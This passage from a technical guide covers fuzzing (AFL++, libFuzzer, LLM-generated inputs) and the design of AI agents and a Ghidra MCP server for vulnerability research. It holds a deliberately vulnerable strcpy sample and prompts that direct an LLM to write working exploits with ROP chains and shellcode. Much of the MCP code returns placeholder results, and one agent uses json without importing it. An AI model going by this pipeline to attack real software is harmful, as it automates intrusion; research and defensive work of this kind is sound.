    rules = compile_rules('rules/')
    
    # Scan file
    matches = scan_file(rules, 'suspicious.exe')
    for match in matches:
        print(f"Match: {match.rule}")
        print(f"  Tags: {match.tags}")
        print(f"  Meta: {match.meta}")
        for string in match.strings:
            print(f"  String: {string}")
    
    # Scan directory
    results = scan_directory(rules, '/path/to/scan/')
    for filepath, matches in results.items():
        print(f"\n{filepath}:")
        for match in matches:
            print(f"  - {match.rule}")
```

---

## SECTION 1.5: VULNERABILITY RESEARCH & FUZZING

### 1.5.1 Fuzzing Tools

| Tool | Type | Platform | Best For |
|------|------|----------|----------|
| **AFL++** | Coverage-guided fuzzer | Linux | General fuzzing |
| **libFuzzer** | In-process fuzzer | Linux | Library fuzzing |
| **Honggfuzz** | Coverage-guided fuzzer | Linux | General fuzzing |
| **AFLNet** | Network protocol fuzzer | Linux | Protocol fuzzing |
| **Boofuzz** | Network protocol fuzzer | Python | Protocol fuzzing |
| **Peach Fuzzer** | Smart fuzzer | Cross-platform | File format fuzzing |
| **Radamsa** | Mutation fuzzer | Cross-platform | Quick fuzzing |
| **zzuf** | Mutation fuzzer | Linux | Quick fuzzing |
| **SymCC** | Symbolic execution fuzzer | Linux | Hybrid fuzzing |
| **QSYM** | Symbolic execution fuzzer | Linux | Hybrid fuzzing |
| **Angora** | Coverage-guided fuzzer | Linux | Targeted fuzzing |
| **Jackalope** | Coverage-guided fuzzer | Cross-platform | Windows/macOS fuzzing |
| **Winafl** | Coverage-guided fuzzer | Windows | Windows fuzzing |
| **Fuzzilli** | JavaScript engine fuzzer | Cross-platform | JS engine fuzzing |
| **Domato** | DOM fuzzer | Cross-platform | Browser fuzzing |
| **AFLGo** | Directed fuzzer | Linux | Targeted fuzzing |

---

### 1.5.2 AFL++ Setup & Usage

**Installation:**

```bash
# Clone AFL++
git clone https://github.com/AFLplusplus/AFLplusplus.git
cd AFLplusplus

# Build
make distrib

# Install
sudo make install

# Install dependencies
sudo apt install build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev
sudo apt install lld-14 llvm-14 llvm-14-dev clang-14 libclang-14-dev
sudo apt install gcc-12 g++-12 libstdc++-12-dev
```

**Basic Fuzzing:**

```bash
# Compile target with instrumentation
afl-clang-fast -o target target.c

# Prepare input corpus
mkdir input
echo "seed" > input/seed1
echo "another" > input/seed2

# Prepare output directory
mkdir output

# Run fuzzer
afl-fuzz -i input -o output -- ./target @@

# For multiple cores
afl-fuzz -i input -o output -M master -- ./target @@
afl-fuzz -i input -o output -S slave1 -- ./target @@
afl-fuzz -i input -o output -S slave2 -- ./target @@
```

**AFL++ with QEMU (binary-only):**

```bash
# Install QEMU mode
cd AFLplusplus/qemu_mode
./build_qemu_support.sh

# Fuzz binary without source
afl-fuzz -i input -o output -Q -- ./binary @@
```

**AFL++ with persistent mode:**

```c
// Persistent mode example
#include <unistd.h>

__AFL_FUZZ_INIT();

int main() {
    #ifdef __AFL_HAVE_MANUAL_CONTROL
    __AFL_INIT();
    #endif
    
    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;
    
    while (__AFL_LOOP(10000)) {
        int len = __AFL_FUZZ_TESTCASE_LEN;
        
        // Process buf with length len
        // This is where your target code goes
        parse_input(buf, len);
    }
    
    return 0;
}
```

**AFL++ with LLVM LTO:**

```bash
# Compile with LTO
afl-clang-lto -o target target.c

# Fuzz
afl-fuzz -i input -o output -- ./target @@
```

---

### 1.5.3 libFuzzer Setup & Usage

**Basic libFuzzer Harness:**

```c
// fuzz_target.c
#include <stdint.h>
#include <stddef.h>

extern int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size);

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Your fuzzing target here
    // Return 0 if input is processed successfully
    // Crash if input triggers a bug
    
    if (size < 4) {
        return 0;
    }
    
    // Example: parse input
    uint32_t magic = *(uint32_t*)data;
    if (magic == 0xDEADBEEF) {
        if (size > 8) {
            // Trigger bug
            char *ptr = NULL;
            *ptr = data[8];  // Null pointer dereference
        }
    }
    
    return 0;
}
```

**Compile and Run:**

```bash
# Compile with libFuzzer
clang -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c

# Run fuzzer
./fuzz_target

# Run with corpus
./fuzz_target corpus/

# Run with dictionary
./fuzz_target -dict=dictionary.txt

# Run with max length
./fuzz_target -max_len=1024

# Run with jobs
./fuzz_target -jobs=4

# Run with workers
./fuzz_target -workers=4
```

---

### 1.5.4 Fuzzing with AI

**AI-Assisted Fuzzing:**

```python
#!/usr/bin/env python3
"""
AI-Assisted Fuzzing
Uses LLM to generate interesting inputs
"""

import subprocess
import random
from openai import OpenAI

client = OpenAI()

def generate_input(prompt: str) -> str:
    """Generate input using LLM"""
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a fuzzing expert. Generate inputs that might trigger bugs in parsers."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.9
    )
    return response.choices[0].message.content

def fuzz_with_ai(target: str, iterations: int = 100):
    """Fuzz a target with AI-generated inputs"""
    
    for i in range(iterations):
        # Generate input
        prompt = f"""
        Generate a fuzzing input for a parser. 
        Iteration: {i}
        Focus: edge cases, boundary conditions, malformed data
        Format: raw bytes (hex encoded)
        """
        
        input_data = generate_input(prompt)
        
        # Write input to file
        with open('/tmp/fuzz_input', 'w') as f:
            f.write(input_data)
        
        # Run target
        result = subprocess.run(
            [target, '/tmp/fuzz_input'],
            capture_output=True,
            timeout=5
        )
        
        # Check for crash
        if result.returncode != 0:
            print(f"[!] Crash found at iteration {i}")
            print(f"Input: {input_data}")
            print(f"Return code: {result.returncode}")
            
            # Save crash
            with open(f'/tmp/crash_{i}', 'w') as f:
                f.write(input_data)
            
            # Analyze crash with AI
            analysis = analyze_crash(input_data, result.stderr.decode())
            print(f"Analysis: {analysis}")

def analyze_crash(input_data: str, stderr: str) -> str:
    """Analyze a crash using LLM"""
    prompt = f"""
    Analyze this crash:
    
    Input: {input_data}
    Stderr: {stderr}
    
    Provide:
    1. Likely vulnerability type
    2. Root cause
    3. Exploitation potential
    4. Suggested fix
    """
    
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are a vulnerability researcher."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.3
    )
    return response.choices[0].message.content

if __name__ == "__main__":
    fuzz_with_ai('./target', iterations=1000)
```

---

# PART TWO: AI-FIRST SOFTWARE INTEGRATION — EXPANDED 3-4X

## The Complete Architecture of AI-Controlled Software Operations

---

## SECTION 2.1: MCP FOR SOFTWARE TOOLS — DEEP DIVE

### 2.1.1 MCP Architecture for Software

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         AI AGENT (LLM)                                       │
│                    (Claude, GPT-4, Hermes, Local LLM)                       │
│                                                                              │
│  "Find and exploit the buffer overflow in this binary"                      │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         MCP CLIENT                                           │
│                                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │   Tool      │  │   Tool      │  │   Tool      │  │   Tool      │        │
│  │   Discovery │  │   Selection │  │   Invocation│  │   Result    │        │
│  │             │  │             │  │             │  │   Handling  │        │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
        ┌───────────────────────────┼───────────────────────────┐
        │                           │                           │
        ▼                           ▼                           ▼
┌───────────────┐          ┌───────────────┐          ┌───────────────┐
│  Ghidra MCP   │          │  GDB MCP      │          │  Frida MCP    │
│               │          │               │          │               │
│  Tools:       │          │  Tools:       │          │  Tools:       │
│  - decompile  │          │  - break      │          │  - hook       │
│  - disassemble│          │  - continue   │          │  - trace      │
│  - xrefs      │          │  - examine    │          │  - dump       │
│  - rename     │          │  - modify     │          │  - inject     │
└───────────────┘          └───────────────┘          └───────────────┘
        │                           │                           │
        ▼                           ▼                           ▼
┌───────────────┐          ┌───────────────┐          ┌───────────────┐
│  Binary       │          │  Running      │          │  Running      │
│  Analysis     │          │  Process      │          │  Process      │
└───────────────┘          └───────────────┘          └───────────────┘
```

---

### 2.1.2 Complete Ghidra MCP Server

```python
#!/usr/bin/env python3
"""
Complete Ghidra MCP Server
Provides full binary analysis via Model Context Protocol
"""

import asyncio
import json
import subprocess
import os
from typing import Any
from mcp.server import Server, stdio_server
from mcp.types import Tool, TextContent, Resource, Prompt

server = Server("ghidra-mcp")

# ============================================================================
# TOOL DEFINITIONS
# ============================================================================

@server.list_tools()
async def list_tools() -> list[Tool]:
    return [
        Tool(
            name="ghidra_open",
            description="Open a binary in Ghidra",
            inputSchema={
                "type": "object",
                "properties": {
                    "binary_path": {"type": "string", "description": "Path to binary"}
                },
                "required": ["binary_path"]
            }
        ),
        Tool(
            name="ghidra_functions",
            description="List all functions",
            inputSchema={"type": "object", "properties": {}}
        ),
        Tool(
            name="ghidra_decompile",
            description="Decompile a function",
            inputSchema={
                "type": "object",
                "properties": {
                    "function": {"type": "string", "description": "Function name or address"}
                },
                "required": ["function"]
            }
        ),
        Tool(
            name="ghidra_disassemble",
            description="Disassemble an address range",
            inputSchema={
                "type": "object",
                "properties": {
                    "start": {"type": "string", "description": "Start address"},
                    "end": {"type": "string", "description": "End address"}
                },
                "required": ["start", "end"]
            }
        ),
        Tool(
            name="ghidra_strings",
            description="List all strings",
            inputSchema={"type": "object", "properties": {}}
        ),
        Tool(
            name="ghidra_xrefs",
            description="Find cross-references to an address",
            inputSchema={
                "type": "object",
                "properties": {
                    "address": {"type": "string", "description": "Target address"}
                },
                "required": ["address"]
            }
        ),
        Tool(
            name="ghidra_search",
            description="Search for a pattern",
            inputSchema={
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Search pattern (hex or string)"},
                    "type": {"type": "string", "enum": ["hex", "string", "regex"], "default": "string"}
                },
                "required": ["pattern"]
            }
        ),
        Tool(
            name="ghidra_rename",
            description="Rename a symbol",
            inputSchema={
                "type": "object",
                "properties": {
                    "address": {"type": "string", "description": "Address to rename"},
                    "name": {"type": "string", "description": "New name"}
                },
                "required": ["address", "name"]
            }
        ),
        Tool(
            name="ghidra_comment",
            description="Add a comment",
            inputSchema={
                "type": "object",
                "properties": {
                    "address": {"type": "string", "description": "Address"},
                    "comment": {"type": "string", "description": "Comment text"}
                },
                "required": ["address", "comment"]
            }
        ),
        Tool(
            name="ghidra_callgraph",
            description="Get call graph for a function",
            inputSchema={
                "type": "object",
                "properties": {
                    "function": {"type": "string", "description": "Function name or address"}
                },
                "required": ["function"]
            }
        ),
        Tool(
            name="ghidra_export",
            description="Export analysis results",
            inputSchema={
                "type": "object",
                "properties": {
                    "format": {"type": "string", "enum": ["json", "c", "asm", "pseudo"], "default": "json"}
                }
            }
        ),
    ]

# ============================================================================
# TOOL IMPLEMENTATIONS
# ============================================================================

@server.call_tool()
async def call_tool(name: str, arguments: dict[str, Any]) -> list[TextContent]:
    if name == "ghidra_open":
        result = await open_binary(arguments["binary_path"])
    elif name == "ghidra_functions":
        result = await list_functions()
    elif name == "ghidra_decompile":
        result = await decompile(arguments["function"])
    elif name == "ghidra_disassemble":
        result = await disassemble(arguments["start"], arguments["end"])
    elif name == "ghidra_strings":
        result = await list_strings()
    elif name == "ghidra_xrefs":
        result = await find_xrefs(arguments["address"])
    elif name == "ghidra_search":
        result = await search(arguments["pattern"], arguments.get("type", "string"))
    elif name == "ghidra_rename":
        result = await rename(arguments["address"], arguments["name"])
    elif name == "ghidra_comment":
        result = await comment(arguments["address"], arguments["comment"])
    elif name == "ghidra_callgraph":
        result = await callgraph(arguments["function"])
    elif name == "ghidra_export":
        result = await export(arguments.get("format", "json"))
    else:
        result = f"Unknown tool: {name}"
    
    return [TextContent(type="text", text=json.dumps(result, indent=2))]

async def open_binary(binary_path):
    """Open a binary in Ghidra"""
    # This would call Ghidra headless
    return {
        "success": True,
        "binary": binary_path,
        "message": f"Opened {binary_path} in Ghidra"
    }

async def list_functions():
    """List all functions"""
    # Placeholder - would call Ghidra
    return {
        "functions": [
            {"name": "main", "address": "0x00401000", "size": 256},
            {"name": "vulnerable_function", "address": "0x00401100", "size": 128},
            {"name": "win", "address": "0x00401200", "size": 64},
        ]
    }

async def decompile(function):
    """Decompile a function"""
    # Placeholder - would call Ghidra
    return {
        "function": function,
        "decompiled": f"""
void {function}(char *input) {{
    char buffer[64];
    strcpy(buffer, input);
    printf("Hello, %s\\n", buffer);
}}
"""
    }

async def disassemble(start, end):
    """Disassemble an address range"""
    return {
        "start": start,
        "end": end,
        "instructions": [
            {"address": start, "instruction": "push rbp"},
            {"address": hex(int(start, 16) + 1), "instruction": "mov rbp, rsp"},
        ]
    }

async def list_strings():
    """List all strings"""
    return {
        "strings": [
            {"address": "0x00402000", "value": "Enter input: "},
            {"address": "0x00402010", "value": "Hello, %s"},
            {"address": "0x00402020", "value": "Access granted!"},
            {"address": "0x00402030", "value": "Access denied."},
        ]
    }

async def find_xrefs(address):
    """Find cross-references"""
    return {
        "address": address,
        "xrefs": [
            {"from": "0x00401100", "type": "CALL"},
            {"from": "0x00401150", "type": "DATA"},
        ]
    }

async def search(pattern, search_type):
    """Search for a pattern"""
    return {
        "pattern": pattern,
        "type": search_type,
        "results": [
            {"address": "0x00402010", "context": "Hello, %s"}
        ]
    }

async def rename(address, name):
    """Rename a symbol"""
    return {
        "success": True,
        "address": address,
        "new_name": name
    }

async def comment(address, comment):
    """Add a comment"""
    return {
        "success": True,
        "address": address,
        "comment": comment
    }

async def callgraph(function):
    """Get call graph"""
    return {
        "function": function,
        "callers": ["main", "init"],
        "callees": ["strcpy", "printf"]
    }

async def export(format):
    """Export analysis"""
    return {
        "success": True,
        "format": format,
        "output": "/tmp/ghidra_export." + format
    }

# ============================================================================
# RESOURCE DEFINITIONS
# ============================================================================

@server.list_resources()
async def list_resources() -> list[Resource]:
    return [
        Resource(
            uri="ghidra://binary/functions",
            name="Function List",
            description="All functions in the binary",
            mimeType="application/json"
        ),
        Resource(
            uri="ghidra://binary/strings",
            name="String List",
            description="All strings in the binary",
            mimeType="application/json"
        ),
        Resource(
            uri="ghidra://binary/imports",
            name="Import List",
            description="All imports in the binary",
            mimeType="application/json"
        ),
    ]

@server.read_resource()
async def read_resource(uri: str) -> str:
    if uri == "ghidra://binary/functions":
        funcs = await list_functions()
        return json.dumps(funcs, indent=2)
    elif uri == "ghidra://binary/strings":
        strings = await list_strings()
        return json.dumps(strings, indent=2)
    elif uri == "ghidra://binary/imports":
        return json.dumps({"imports": ["strcpy", "printf", "malloc", "free"]}, indent=2)
    else:
        return json.dumps({"error": "Resource not found"})

# ============================================================================
# PROMPT DEFINITIONS
# ============================================================================

@server.list_prompts()
async def list_prompts() -> list[Prompt]:
    return [
        Prompt(
            name="find_vulnerabilities",
            description="Find vulnerabilities in a binary",
            arguments=[
                {"name": "binary", "description": "Path to binary", "required": True}
            ]
        ),
        Prompt(
            name="exploit_development",
            description="Develop an exploit for a vulnerability",
            arguments=[
                {"name": "vulnerability", "description": "Vulnerability description", "required": True}
            ]
        ),
        Prompt(
            name="malware_analysis",
            description="Analyze a malware sample",
            arguments=[
                {"name": "sample", "description": "Path to malware sample", "required": True}
            ]
        ),
    ]

@server.get_prompt()
async def get_prompt(name: str, arguments: dict) -> str:
    if name == "find_vulnerabilities":
        return f"""Analyze the binary at {arguments['binary']} for vulnerabilities.

Steps:
1. Identify all functions
2. Look for dangerous function calls (strcpy, sprintf, gets, etc.)
3. Check for buffer overflows
4. Check for format string vulnerabilities
5. Check for integer overflows
6. Check for use-after-free
7. Check for race conditions
8. Report findings with addresses and exploitability

Output format:
- Vulnerability type
- Location (function, address)
- Root cause
- Exploitability (low/medium/high)
- Suggested fix"""

    elif name == "exploit_development":
        return f"""Develop an exploit for the following vulnerability:
{arguments['vulnerability']}

Steps:
1. Analyze the vulnerability
2. Determine exploit strategy
3. Identify required gadgets/addresses
4. Build exploit payload
5. Test exploit
6. Refine as needed

Output format:
- Exploit strategy
- Required offsets/gadgets
- Exploit code (Python/pwntools)
- Testing results"""

    elif name == "malware_analysis":
        return f"""Analyze the malware sample at {arguments['sample']}.

Steps:
1. Static analysis (strings, imports, sections)
2. Dynamic analysis (behavior, network)
3. Identify family/type
4. Extract IOCs
5. Determine capabilities
6. Assess risk

Output format:
- Malware family
- Type (ransomware, RAT, etc.)
- Capabilities
- IOCs (hashes, domains, IPs)
- Risk assessment
- Recommendations"""

    else:
        return "Unknown prompt"

# ============================================================================
# MAIN
# ============================================================================

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream)

if __name__ == "__main__":
    asyncio.run(main())
```

---

## SECTION 2.2: AI AGENTS FOR VULNERABILITY RESEARCH

### 2.2.1 Vulnerability Research Agent

```python
#!/usr/bin/env python3
"""
Vulnerability Research Agent
Uses LLM to find vulnerabilities in source code and binaries
"""

import asyncio
from openai import OpenAI
from mcp.client import MCPClient

class VulnResearchAgent:
    def __init__(self, model: str = "gpt-4"):
        self.client = OpenAI()
        self.model = model
        self.mcp = MCPClient()
        
        # Register MCP servers
        self.mcp.register_server("ghidra", "ghidra-mcp")
        self.mcp.register_server("gdb", "gdb-mcp")
        self.mcp.register_server("frida", "frida-mcp")
    
    async def analyze_source(self, source_code: str) -> list:
        """Analyze source code for vulnerabilities"""
        
        prompt = f"""
        Analyze the following source code for security vulnerabilities.
        
        Source code:
        ```
        {source_code}
        ```
        
        For each vulnerability found, provide:
        1. Vulnerability type (CWE)
        2. Location (line number)
        3. Root cause
        4. Exploitability (low/medium/high)
        5. Suggested fix
        6. Proof-of-concept input (if applicable)
        
        Focus on:
        - Buffer overflows
        - Format string vulnerabilities
        - Integer overflows
        - Use-after-free
        - Race conditions
        - Injection vulnerabilities
        - Authentication bypasses
        - Authorization flaws
        """
        
        response = self.client.chat.completions.create(
            model=self.model,
            messages=[
                {"role": "system", "content": "You are a vulnerability researcher."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.2
        )
        
        return self._parse_vulnerabilities(response.choices[0].message.content)
    
    async def analyze_binary(self, binary_path: str) -> list:
        """Analyze a binary for vulnerabilities"""
        
        # Open in Ghidra
        await self.mcp.call("ghidra", "ghidra_open", {"binary_path": binary_path})
        
        # Get functions
        functions = await self.mcp.call("ghidra", "ghidra_functions", {})
        
        vulnerabilities = []
        
        for func in functions["functions"]:
            # Decompile function
            decompiled = await self.mcp.call("ghidra", "ghidra_decompile", {
                "function": func["name"]
            })
            
            # Analyze with LLM
            prompt = f"""
            Analyze this decompiled function for vulnerabilities:
            
            ```
            {decompiled['decompiled']}
            ```
            
            Look for:
            - Buffer overflows
            - Format string vulnerabilities
            - Integer overflows
            - Use-after-free
            - Null pointer dereferences
            
            If a vulnerability is found, provide:
            1. Type
            2. Root cause
            3. Exploitability
            4. Suggested fix
            """
            
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "You are a vulnerability researcher."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.2
            )
            
            # Parse response
            if "vulnerability" in response.choices[0].message.content.lower():
                vulnerabilities.append({
                    "function": func["name"],
                    "analysis": response.choices[0].message.content
                })
        
        return vulnerabilities
    
    async def develop_exploit(self, vulnerability: dict) -> str:
        """Develop an exploit for a vulnerability"""
        
        prompt = f"""
        Develop a working exploit for the following vulnerability:
        
        {json.dumps(vulnerability, indent=2)}
        
        Provide:
        1. Exploit strategy
        2. Required offsets
        3. ROP chain (if needed)
        4. Shellcode (if needed)
        5. Python/pwntools exploit code
        6. Testing instructions
        
        Be specific and provide working code.
        """
        
        response = self.client.chat.completions.create(
            model=self.model,
            messages=[
                {"role": "system", "content": "You are an exploit developer."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.2
        )
        
        return response.choices[0].message.content
    
    async def fuzz_target(self, binary_path: str, iterations: int = 1000):
        """Fuzz a binary target"""
        
        # Generate fuzzing inputs with LLM
        for i in range(iterations):
            prompt = f"""
            Generate a fuzzing input for a binary parser.
            Iteration: {i}
            Focus: edge cases, boundary conditions, malformed data
            Format: raw bytes (hex encoded)
            """
            
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "You are a fuzzing expert."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.9
            )
            
            input_data = response.choices[0].message.content
            
            # Write input
            with open('/tmp/fuzz_input', 'w') as f:
                f.write(input_data)
            
            # Run target
            result = await self._run_binary(binary_path, '/tmp/fuzz_input')
            
            # Check for crash
            if result['returncode'] != 0:
                # Analyze crash
                crash_analysis = await self._analyze_crash(input_data, result['stderr'])
                print(f"[!] Crash found at iteration {i}")
                print(f"Analysis: {crash_analysis}")
                
                # Save crash
                with open(f'/tmp/crash_{i}.txt', 'w') as f:
                    f.write(f"Input: {input_data}\n")
                    f.write(f"Return code: {result['returncode']}\n")
                    f.write(f"Stderr: {result['stderr']}\n")
                    f.write(f"Analysis: {crash_analysis}\n")
    
    async def _run_binary(self, binary_path: str, input_file: str) -> dict:
        """Run a binary with input"""
        import subprocess
        try:
            result = subprocess.run(
                [binary_path, input_file],
                capture_output=True,
                timeout=5
            )
            return {
                'returncode': result.returncode,
                'stdout': result.stdout.decode('utf-8', errors='ignore'),
                'stderr': result.stderr.decode('utf-8', errors='ignore')
            }
        except subprocess.TimeoutExpired:
            return {'returncode': -1, 'stdout': '', 'stderr': 'Timeout'}
    
    async def _analyze_crash(self, input_data: str, stderr: str) -> str:
        """Analyze a crash"""
        prompt = f"""
        Analyze this crash:
        
        Input: {input_data}
        Stderr: {stderr}
        
        Provide:
        1. Likely vulnerability type
        2. Root cause
        3. Exploitation potential
        4. Suggested fix
        """
        
        response = self.client.chat.completions.create(
            model=self.model,
            messages=[
                {"role": "system", "content": "You are a vulnerability researcher."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.3
        )
        
        return response.choices[0].message.content
    
    def _parse_vulnerabilities(self, text: str) -> list:
        """Parse vulnerabilities from LLM response"""
        # Implementation would parse structured output
        return [{"raw": text}]

if __name__ == "__main__":
    agent = VulnResearchAgent()
    
    # Example: Analyze source code
    source = """
    #include <stdio.h>
    #include <string.h>
    
    void vulnerable(char *input) {
        char buffer[64];
        strcpy(buffer, input);
        printf("Hello, %s\n", buffer);
    }
    
    int main(int argc, char **argv) {
        if (argc > 1) {
            vulnerable(argv[1]);
        }
        return 0;
    }
    """
    
    vulnerabilities = asyncio.run(agent.analyze_source(source))
    print(json.dumps(vulnerabilities, indent=2))
```

---

## SECTION 2.3: HERMES AGENT ARCHITECTURE FOR SOFTWARE OPERATIONS — DEEP DIVE

### 2.3.1 Hermes Software Agent Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HERMES SOFTWARE AGENT ARCHITECTURE                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐│
│  │                         ORCHESTRATION LAYER                             ││
│  │                                                                          ││
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   ││
│  │  │   Manager   │  │   Task      │  │   Agent     │  │   Event     │   ││
│  │  │   Agent     │  │   Queue     │  │   Registry  │  │   Bus       │   ││
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘   ││
│  │                                                                          ││
│  │  Manager Agent Responsibilities:                                        ││
│  │  - Decompose high-level goals (e.g., "Find and exploit bugs")          ││
│  │  - Assign tasks to specialized agents                                   ││
│  │  - Monitor progress and handle failures                                 ││
│  │  - Aggregate results and generate reports                              ││
│  │                                                                          ││
│  └─────────────────────────────────────────────────────────────────────────┘│
│                                    │                                         │
│                                    ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐│
│  │                         AGENT RUNTIME LAYER                             ││
│  │                                                                          ││
│  │  ┌─────────────────────────────────────────────────────────────────────┐││
│  │  │                         EVENT LOOP                                   │││
│  │  │                                                                      │││
│  │  │  States: IDLE → POLLING → PROCESSING → DISPATCHING → WAITING →      │││
│  │  │          AGGREGATING → YIELDING → IDLE                              │││
│  │  │                                                                      │││
│  │  │  Error States: ERROR → RETRY → PROCESSING                           │││
│  │  └─────────────────────────────────────────────────────────────────────┘││
│  │                                                                          ││
│  │  ┌─────────────────────────────────────────────────────────────────────┐││
│  │  │                         TASK QUEUE                                   │││
│  │  │                                                                      │││
│  │  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐│││
│  │  │  │   Pending   │  │   Active    │  │   Complete  │  │   Failed   ││││
│  │  │  │   Tasks     │  │   Tasks     │  │   Tasks     │  │   Tasks    ││││
│  │  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘│││
│  │  └─────────────────────────────────────────────────────────────────────┘││
│  │                                                                          ││
│  │  ┌─────────────────────────────────────────────────────────────────────┐││
│  │  │                         MEMORY SYSTEMS                               │││
│  │  │                                                                      │││
│  │  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐│││
│  │  │  │   Short-    │  │   Long-     │  │   Episodic  │  │   Semantic  ││││
│  │  │  │   Term      │  │   Term      │  │   Memory    │  │   Memory    ││││
│  │  │  │   (Redis)   │  │   (Vector)  │  │   (Graph)   │  │   (KB)      ││││
│  │  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘│││
│  │  │                                                                      │││
│  │  │  Software-specific memory:                                          │││
│  │  │  - Binary analysis results                                          │││
│  │  │  - Exploit templates                                                │││
│  │  │  - Vulnerability database                                           │││
│  │  │  - Gadget database                                                  │││
│  │  │  - Shellcode database                                               │││
│  │  └─────────────────────────────────────────────────────────────────────┘││
│  │                                                                          ││
│  │  ┌─────────────────────────────────────────────────────────────────────┐││
│  │  │                         TOOL REGISTRY                                │││
│  │  │                                                                      │││
│  │  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐│││
│  │  │  │   Ghidra    │  │   GDB       │  │   Frida     │  │   pwntools  ││││
│  │  │  │   MCP       │  │   MCP       │  │   MCP       │  │   MCP       ││││
│  │  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘│││
│  │  │                                                                      │││
│  │  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐│││
│  │  │  │   AFL++     │  │   YARA      │  │   Burp      │  │   Metasploit││││
│  │  │  │   MCP       │  │   MCP       │  │   MCP       │  │   MCP       ││││
│  │  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘│││
│  │  └─────────────────────────────────────────────────────────────────────┘││
│  │                                                                          ││
│  └─────────────────────────────────────────────────────────────────────────┘│
│                                    │                                         │
│                                    ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐│
│  │                         SPECIALIZED AGENTS                              ││
│  │                                                                          ││
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   ││
│  │  │   Binary    │  │   Web       │  │   Fuzzing   │  │   Malware   │   ││
│  │  │   Analyst   │  │   Analyst   │  │   Agent     │  │   Analyst   │   ││
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘   ││
│  │                                                                          ││
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   ││
│  │  │   Exploit   │  │   Reverse   │  │   Report    │  │   Safety    │   ││
│  │  │   Developer │  │   Engineer  │  │   Writer    │  │   Agent     │   ││
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘   ││
│  │                                                                          ││
│  └─────────────────────────────────────────────────────────────────────────┘│
│                                    │                                         │
│                                    ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────────────┐│
│  │                         SOFTWARE LAYER                                  ││
│  │                                                                          ││
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   ││
│  │  │   Binaries  │  │   Web Apps  │  │   APIs      │  │   Firmware  │   ││
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘   ││
│  │                                                                          ││
│  └─────────────────────────────────────────────────────────────────────────┘│
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### 2.3.2 Binary Analysis Agent

```python
#!/usr/bin/env python3
"""
Binary Analysis Agent
Specialized agent for binary analysis and exploitation
"""

import asyncio
import json
from typing import Any
from mcp.client import MCPClient

class BinaryAnalysisAgent:
    def __init__(self, name: str = "binary-analyst"):
        self.name = name
        self.available = True
        self.current_task = None
        self.mcp = MCPClient()
        
        # Register MCP servers
        self.mcp.register_server("ghidra", "ghidra-mcp")
        self.mcp.register_server("gdb", "gdb-mcp")
        self.mcp.register_server("pwntools", "pwntools-mcp")
        self.mcp.register_server("ropgadget", "ropgadget-mcp")
    
    def is_available(self) -> bool:
        return self.available
    
    async def execute(self, task) -> Any:
        """Execute a binary analysis task"""
        self.available = False
        self.current_task = task
        
        try:
            action = task.description.get('action')
            
            if action == 'analyze':
                result = await self.analyze(task.description)
            elif action == 'find_vulnerabilities':
                result = await self.find_vulnerabilities(task.description)
            elif action == 'develop_exploit':
                result = await self.develop_exploit(task.description)
            elif action == 'find_gadgets':
                result = await self.find_gadgets(task.description)
            elif action == 'generate_shellcode':
                result = await self.generate_shellcode(task.description)
            else:
                result = {'error': f'Unknown action: {action}'}
            
            return result
        finally:
            self.available = True
            self.current_task = None
    
    async def analyze(self, params: dict) -> dict:
        """Analyze a binary"""
        binary_path = params['binary_path']
        
        # Open binary
        await self.mcp.call("ghidra", "ghidra_open", {"binary_path": binary_path})
        
        # Get information
        functions = await self.mcp.call("ghidra", "ghidra_functions", {})
        strings = await self.mcp.call("ghidra", "ghidra_strings", {})
        
        # Check mitigations
